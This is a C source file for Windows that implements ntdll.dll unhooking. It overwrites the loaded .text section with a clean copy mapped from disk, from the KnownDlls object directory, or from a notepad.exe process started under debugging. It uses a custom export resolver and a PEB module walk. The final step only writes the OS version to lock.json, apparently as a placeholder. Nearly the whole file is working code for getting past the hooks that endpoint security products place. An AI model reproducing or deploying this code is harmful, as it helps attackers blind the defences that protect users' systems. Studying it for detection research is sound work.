#include <stdio.h>
#include <windows.h>


// Constants
#define SECTION_MAP_READ 0x0004
#define OBJ_CASE_INSENSITIVE 0x00000040
#define DEBUG_PROCESS 0x00000001


// Enums
typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
} PROCESSINFOCLASS;


// Structs
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


// Functions
void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a) {
    p->Length = sizeof(OBJECT_ATTRIBUTES);
    p->RootDirectory = NULL;
    p->Attributes = a;
    p->ObjectName = n;
    p->SecurityDescriptor = NULL;
    p->SecurityQualityOfService = NULL;
}

UNICODE_STRING InitUnicodeString(LPCWSTR str) {
    UNICODE_STRING us;
    us.Buffer = (PWSTR)str;
    us.Length = wcslen(str) * sizeof(WCHAR);
    us.MaximumLength = us.Length + sizeof(WCHAR);
    return us;
}

typedef LONG(WINAPI* RtlGetVersionPtr)(POSVERSIONINFOW);
typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* NtOpenSectionFn)(HANDLE* SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE Handle);

RtlGetVersionPtr RtlGetVersion;
NtQueryInformationProcessFn NtQueryInformationProcess;
NtReadVirtualMemoryFn NtReadVirtualMemory;
NtOpenSectionFn NtOpenSection;
NtCloseFn NtClose;


void Lock(const char* filename) {
    OSVERSIONINFOW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (RtlGetVersion(&osvi) == 0) {
        FILE* file;
        errno_t err = fopen_s(&file, filename, "w");

        if (err != 0) {
            printf("Error: Cannot open file for writing\n");
            return;
        }

        // Write JSON
        fprintf(file, "[{\"field0\" : \"%lu\" , \"field1\" : \"%lu\" , \"field2\" : \"%lu\"}]",
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);

        // Close handle
        fclose(file);
        printf("[+] File %s generated.\n", filename);
    }
    else {
        printf("Error: RtlGetVersion call failed\n");
    }
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////
// Overwrite hooked ntdll .text section with a clean version
void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    DWORD dwOldProtection;

    // VirtualProtect to PAGE_EXECUTE_WRITECOPY
    if (!VirtualProtect(localNtdllTxt, localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        printf("[-] Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)\n");
        ExitProcess(0);
    }
    // getchar();

    // Copy from one address to the other
    memcpy(localNtdllTxt, unhookedNtdllTxt, localNtdllTxtSize);
    // getchar();

    // VirtualProtect back to the original protection
    if (!VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        printf("[-] Error calling VirtualProtect (dwOldProtection)\n");
        ExitProcess(0);
    }
}


// Get BaseOfCode and SizeOfCode
int* GetTextSectionInfo(LPVOID ntdll_address) {
    HANDLE hProcess = GetCurrentProcess();
    BYTE data[4];

    // Check MZ Signature (2 bytes)
    BYTE signature_dos_header[2];
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, ntdll_address, signature_dos_header, 2, &bytesRead) || bytesRead != 2) {
        printf("[-] Error reading DOS header signature\n");
        ExitProcess(0);
    }

    if (signature_dos_header[0] != 'M' || signature_dos_header[1] != 'Z') {
        printf("[-] Incorrect DOS header signature\n");
        ExitProcess(0);
    }

    // Read e_lfanew (4 bytes) at offset 0x3C
    DWORD e_lfanew;
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) || bytesRead != 4) {
        printf("[-] Error reading e_lfanew\n");
        ExitProcess(0);
    }

    // Check PE Signature (2 bytes)
    BYTE signature_nt_header[2];
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew, signature_nt_header, 2, &bytesRead) || bytesRead != 2) {
        printf("[-] Error reading NT header signature\n");
        ExitProcess(0);
    }

    if (signature_nt_header[0] != 'P' || signature_nt_header[1] != 'E') {
        printf("[-] Incorrect NT header signature\n");
        ExitProcess(0);
    }

    // Check Optional Headers Magic field value (2 bytes)
    WORD optional_header_magic;
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24, &optional_header_magic, 2, &bytesRead) || bytesRead != 2) {
        printf("[-] Error reading Optional Header Magic\n");
        ExitProcess(0);
    }

    if (optional_header_magic != 0x20B && optional_header_magic != 0x10B) {
        printf("[-] Incorrect Optional Header Magic field value\n");
        ExitProcess(0);
    }

    // Read SizeOfCode (4 bytes)
    DWORD sizeofcode;
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) || bytesRead != 4) {
        printf("[-] Error reading SizeOfCode\n");
        ExitProcess(0);
    }

    // Read BaseOfCode (4 bytes)
    DWORD baseofcode;
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) || bytesRead != 4) {
        printf("[-] Error reading BaseOfCode\n");
        ExitProcess(0);
    }

    // Return BaseOfCode and SizeOfCode as an array
    static int result[2];
    result[0] = baseofcode;
    result[1] = sizeofcode;

    return result;
}


// Read remote IntPtr (8-bytes)
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[8];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return NULL;
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


// Read remote Unicode string
char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[256];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
    }

    static char unicode_str[128];
    int str_index = 0;

    for (int i = 0; i < sizeof(buff) - 1; i += 2) {
        if (buff[i] == 0 && buff[i + 1] == 0) {
            break;
        }
        wchar_t wch = *(wchar_t*)&buff[i];
        unicode_str[str_index++] = (char)wch;
    }
    unicode_str[str_index] = '\0';
    return unicode_str;
}



LPVOID GetModuleAddress(const char* dll_name) {
    // ModuleInformation* module_list = (ModuleInformation*)malloc(1024 * sizeof(ModuleInformation));
    int module_counter = 0;

    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;

    BYTE pbi_byte_array[48];
    void* pbi_addr = (void*)pbi_byte_array;

    ULONG ReturnLength;
    HANDLE hProcess = GetCurrentProcess();
    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;

    //printf("[+] pbi_addr: \t\t0x%p \n", pbi_addr);
    //printf("[+] peb pointer: \t0x%p\n", peb_pointer);
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);
    
    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        
        // Get DLL base address
        dll_base = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(hProcess, buffer);
        
        // Compare (but it is always the first...)
        if (strcmp(base_dll_name, dll_name) == 0) {
            return dll_base;
        }      
        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
    }

    return 0;
}


// Map ntdl.dll from the file in disk and return view address
LPVOID MapNtdllFromDisk(const char* ntdll_path) {
    // CreateFileA
    HANDLE hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error calling CreateFileA\n");
        ExitProcess(0);
    }

    // CreateFileMappingA
    HANDLE hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (hSection == NULL) {
        printf("[-] Error calling CreateFileMappingA\n");
        CloseHandle(hFile);
        ExitProcess(0);
    }

    // MapViewOfFile
    LPVOID pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        printf("[-] Error calling MapViewOfFile\n");
        CloseHandle(hSection);
        CloseHandle(hFile);
        ExitProcess(0);
    }

    // Close handles
    if (!CloseHandle(hFile) || !CloseHandle(hSection)) {
        printf("[-] Error calling CloseHandle\n");
        ExitProcess(0);
    }

    return pNtdllBuffer;
}


LPVOID MapNtdllFromKnownDlls() {
    LPCWSTR dll_name = L"\\KnownDlls\\ntdll.dll";

    if (sizeof(void*) == 4) {
        dll_name = L"\\KnownDlls32\\ntdll.dll";
    }

    UNICODE_STRING us = InitUnicodeString(dll_name);
    OBJECT_ATTRIBUTES obj_attr;
    InitializeObjectAttributes(&obj_attr, &us, OBJ_CASE_INSENSITIVE);

    HANDLE hSection = NULL;
    NTSTATUS status = NtOpenSection(&hSection, SECTION_MAP_READ, &obj_attr);
    if (status != 0) {
        wprintf(L"[-] Error calling NtOpenSection. NTSTATUS: 0x%X\n", status);
        ExitProcess(0);
    }

    PVOID pNtdllBuffer = MapViewOfFile(hSection, SECTION_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        wprintf(L"[-] Error calling MapViewOfFile\n");
        ExitProcess(0);
    }

    status = NtClose(hSection);
    if (status != 0) {
        wprintf(L"[-] Error calling CloseHandle\n");
        ExitProcess(0);
    }

    return pNtdllBuffer;
}


LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi = { 0 };

    BOOL createprocess_res = CreateProcessA(
        process_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!createprocess_res) {
        printf("[-] Error calling CreateProcess\n");
        ExitProcess(0);
    }

    HANDLE localNtdllHandle = GetModuleAddress("ntdll.dll");
    int* result = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = result[0];
    int localNtdllTxtSize = result[1];
    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);
    
    BYTE* ntdllBuffer = (BYTE*)malloc(localNtdllTxtSize);
    SIZE_T bytesRead;
    BOOL readprocmem_res = ReadProcessMemory(
        pi.hProcess,
        localNtdllTxt,
        ntdllBuffer,
        localNtdllTxtSize,
        &bytesRead
    );

    if (!readprocmem_res) {
        printf("[-] Error calling ReadProcessMemory\n");
        ExitProcess(0);
    }

    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;

    BOOL debugstop_res = DebugActiveProcessStop(pi.dwProcessId);
    BOOL terminateproc_res = TerminateProcess(pi.hProcess, 0);
    if (!debugstop_res || !terminateproc_res) {
        printf("[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
        ExitProcess(0);
    }

    BOOL closehandle_proc = CloseHandle(pi.hProcess);
    BOOL closehandle_thread = CloseHandle(pi.hThread);
    if (!closehandle_proc || !closehandle_thread) {
        printf("[-] Error calling CloseHandle\n");
        ExitProcess(0);
    }

    return pNtdllBuffer;
}


void ReplaceLibrary(const char* option){
    const int offset_mappeddll = 4096;
    long long unhookedNtdllTxt = 0;

    if (strcmp(option, "disk") == 0) {
        // printf("[+] Option: Disk\n");
        const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
        LPVOID unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
        unhookedNtdllTxt = (long long)unhookedNtdllHandle + offset_mappeddll;
    }
    else if (strcmp(option, "knowndlls") == 0) {
        // printf("[+] Option: Knowndlls\n");
        LPVOID unhookedNtdllHandle = MapNtdllFromKnownDlls();
        unhookedNtdllTxt = (long long)unhookedNtdllHandle + offset_mappeddll;
    }
    else if (strcmp(option, "debugproc") == 0) {
        // printf("[+] Option: Debugproc\n");
        const char* proc_path = "c:\\Windows\\System32\\notepad.exe";
        unhookedNtdllTxt = (long long)MapNtdllFromDebugProc(proc_path);
    }
    else {
        return;
    }

    const char* targetDll = "ntdll.dll";
    LPVOID localNtdllHandle = GetModuleAddress(targetDll);
    int* textSectionInfo = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = textSectionInfo[0];
    int localNtdllTxtSize = textSectionInfo[1];
    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;

    printf("[+] Copying %d bytes from 0x%p to 0x%p.\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);
    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////


void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
    // Offsets for 32-bit and 64-bit processes
    int exportrva_offset = 136; // 64-bit
    // Get current process handle
    HANDLE hProcess = GetCurrentProcess();
    // DOS header (IMAGE_DOS_HEADER)->e_lfanew
    DWORD e_lfanew_value = 0;
    SIZE_T aux = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + 0x3C, &e_lfanew_value, sizeof(e_lfanew_value), &aux);
    // printf("[*] e_lfanew: \t\t\t\t\t0x%X\n", e_lfanew_value);
    // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
    WORD sizeopthdr_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + 20, &sizeopthdr_value, sizeof(sizeopthdr_value), &aux);
    // printf("[*] SizeOfOptionalHeader: \t\t\t0x%X\n", sizeopthdr_value);
    // Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
    DWORD exportTableRVA_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + exportrva_offset, &exportTableRVA_value, sizeof(exportTableRVA_value), &aux);
    // printf("[*] exportTableRVA address: \t\t\t0x%X\n", exportTableRVA_value);
    if (exportTableRVA_value != 0) {
        // Read NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
        DWORD numberOfNames_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x18, &numberOfNames_value, sizeof(numberOfNames_value), &aux);
        // printf("[*] numberOfNames: \t\t\t\t0x%X\n", numberOfNames_value);
        // Read AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
        DWORD addressOfFunctionsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x1C, &addressOfFunctionsVRA_value, sizeof(addressOfFunctionsVRA_value), &aux);
        // printf("[*] addressOfFunctionsVRA: \t\t\t0x%X\n", addressOfFunctionsVRA_value);
        // Read AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
        DWORD addressOfNamesVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x20, &addressOfNamesVRA_value, sizeof(addressOfNamesVRA_value), &aux);
        // printf("[*] addressOfNamesVRA: \t\t\t\t0x%X\n", addressOfNamesVRA_value);
        // Read AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
        DWORD addressOfNameOrdinalsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x24, &addressOfNameOrdinalsVRA_value, sizeof(addressOfNameOrdinalsVRA_value), &aux);
        // printf("[*] addressOfNameOrdinalsVRA: \t\t\t0x%X\n", addressOfNameOrdinalsVRA_value);
        void* addressOfFunctionsRA = (BYTE*)pDosHdr + addressOfFunctionsVRA_value;
        void* addressOfNamesRA = (BYTE*)pDosHdr + addressOfNamesVRA_value;
        void* addressOfNameOrdinalsRA = (BYTE*)pDosHdr + addressOfNameOrdinalsVRA_value;
        for (int i = 0; i < numberOfNames_value; i++) {
            DWORD functionAddressVRA = 0;
            NtReadVirtualMemory(hProcess, addressOfNamesRA, &functionAddressVRA, sizeof(functionAddressVRA), &aux);
            void* functionAddressRA = (BYTE*)pDosHdr + functionAddressVRA;
            char functionName[256];
            NtReadVirtualMemory(hProcess, functionAddressRA, functionName, strlen(func_name) + 1, &aux);
            if (strcmp(functionName, func_name) == 0) {
                WORD ordinal = 0;
                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsRA, &ordinal, sizeof(ordinal), &aux);
                // printf("[+] Ordinal: %d\n", ordinal);
                void* functionAddress;
                NtReadVirtualMemory(hProcess, (BYTE*)addressOfFunctionsRA + ordinal * 4, &functionAddress, sizeof(functionAddress), &aux);
                // printf("[+] functionAddress: \t\t\t\t0x%p\n", functionAddress);
                uintptr_t maskedFunctionAddress = (uintptr_t)functionAddress & 0xFFFFFFFF;
                return (BYTE*)pDosHdr + (DWORD_PTR)maskedFunctionAddress;
            }
            addressOfNamesRA = (BYTE*)addressOfNamesRA + 4;
            addressOfNameOrdinalsRA = (BYTE*)addressOfNameOrdinalsRA + 2;
        }
    }
    return NULL;
}


void initializeFunctions() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress((HMODULE)hNtdll, "NtReadVirtualMemory");

    RtlGetVersion = (RtlGetVersionPtr)CustomGetProcAddress(hNtdll, "RtlGetVersion");
    NtClose = (NtCloseFn)CustomGetProcAddress(hNtdll, "NtClose");
    NtOpenSection = (NtOpenSectionFn)CustomGetProcAddress(hNtdll, "NtOpenSection");
}


int main(int argc, char* argv[]) {
    initializeFunctions();

    // Replace ntdll library
    const char* ntdll_option = "default";
    if (argc >= 2)
    {
        ntdll_option = argv[1];
    }
    ReplaceLibrary(ntdll_option);
    
    const char* filename = "lock.json";
    Lock(filename);

    return 0;
}